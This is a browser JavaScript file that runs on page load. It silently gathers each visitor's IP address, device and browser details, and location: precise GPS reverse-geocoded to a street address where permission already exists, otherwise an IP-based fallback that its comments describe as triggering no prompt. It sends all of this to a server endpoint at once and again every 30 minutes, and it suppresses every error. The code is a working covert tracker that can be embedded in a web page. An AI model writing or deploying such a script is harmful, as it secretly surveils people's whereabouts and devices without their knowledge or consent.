document.addEventListener('DOMContentLoaded', () => {

  async function getIPAddress() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (e) {
      return 'Unknown';
    }
  }

  function parseUserAgent() {
    const ua = navigator.userAgent;
    let browserName = "Unknown", browserVersion = "Unknown";
    let osName = "Unknown", osVersion = "Unknown";

    if (ua.indexOf("Firefox") > -1) { browserName = "Firefox"; }
    else if (ua.indexOf("SamsungBrowser") > -1) { browserName = "Samsung Browser"; }
    else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) { browserName = "Opera"; }
    else if (ua.indexOf("Trident") > -1) { browserName = "Internet Explorer"; }
    else if (ua.indexOf("Edge") > -1 || ua.indexOf("Edg") > -1) { browserName = "Edge"; }
    else if (ua.indexOf("Chrome") > -1) { browserName = "Chrome"; }
    else if (ua.indexOf("Safari") > -1) { browserName = "Safari"; }

    if (ua.indexOf("Win") > -1) { osName = "Windows"; }
    else if (ua.indexOf("Mac") > -1) { osName = "MacOS"; }
    else if (ua.indexOf("X11") > -1 || ua.indexOf("Linux") > -1) { osName = "Linux"; }
    else if (ua.indexOf("Android") > -1) { osName = "Android"; }
    else if (ua.indexOf("like Mac OS X") > -1 || ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) { osName = "iOS"; }

    return { browserName, browserVersion, osName, osVersion };
  }

  function getGeolocation() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Geolocation is not supported by this browser."));
      } else {
        const options = {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        };
        navigator.geolocation.getCurrentPosition(resolve, reject, options);
      }
    });
  }

  async function getGeoWithFallback() {
    // 1. Try to see if permission is already granted for high accuracy GPS
    try {
      const perm = await navigator.permissions.query({ name: 'geolocation' });
      if (perm.state === 'granted') {
        const pos = await getGeolocation();
        let addressData = {};
        try {
          const revResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
          const geoJSON = await revResponse.json();
          const addr = geoJSON.address || {};
          
          addressData = {
            country: addr.country,
            city: addr.city || addr.town || addr.village,
            street: addr.road,
            houseNumber: addr.house_number,
            postalCode: addr.postcode,
            formattedAddress: geoJSON.display_name
          }
        } catch(e) {
          // Silent fail for geocoding
        }

        return {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          timestamp: pos.timestamp,
          address: addressData
        };
      }
    } catch(e) {
      // permissions API might not be supported, proceed to silent fallback
    }

    // 2. Silent IP-based fallback (no browser prompt)
    try {
      const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
      const data = await response.json();
      return {
        latitude: parseFloat(data.latitude),
        longitude: parseFloat(data.longitude),
        accuracy: 10000,   // Approximate accuracy for IP geo
        timestamp: Date.now(),
        address: {
          country: data.country,
          city: data.city,
          street: "",
          houseNumber: "",
          postalCode: "",
          formattedAddress: `${data.city ? data.city + ', ' : ''}${data.region ? data.region + ', ' : ''}${data.country || 'Unknown'}`
        }
      };
    } catch (err) {
      return null;
    }
  }

  async function transmitData() {
    const uaInfo = parseUserAgent();
    let deviceType = "Desktop";
    if (/Mobi|Android/i.test(navigator.userAgent)) deviceType = "Mobile";
    if (/Tablet|iPad/i.test(navigator.userAgent)) deviceType = "Tablet";

    // Requesting location will trigger browser prompt implicitly
    const locationInfo = await getGeoWithFallback();
    const ipAddress = await getIPAddress();

    const userData = {
      timestamp: new Date().toISOString(),
      ipAddress: ipAddress,
      browser: { name: uaInfo.browserName, version: uaInfo.browserVersion },
      os: { name: uaInfo.osName, version: uaInfo.osVersion },
      device: { model: navigator.platform || 'Unknown', type: deviceType, vendor: navigator.vendor || 'Unknown' },
      screen: { width: window.screen.width, height: window.screen.height, colorDepth: window.screen.colorDepth },
      language: navigator.language || navigator.userLanguage,
      platform: navigator.platform,
      referrer: document.referrer || '',
      userAgent: navigator.userAgent,
      location: locationInfo
    };

    try {
      await fetch('/UTS7/send_location.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData)
      });
    } catch(err) {
      // Silent error
    }
  }

  // Execute silently immediately
  transmitData();

  // Transmit repeatedly every 30 minutes (30 * 60 * 1000 = 1800000 ms)
  setInterval(transmitData, 1800000);
});
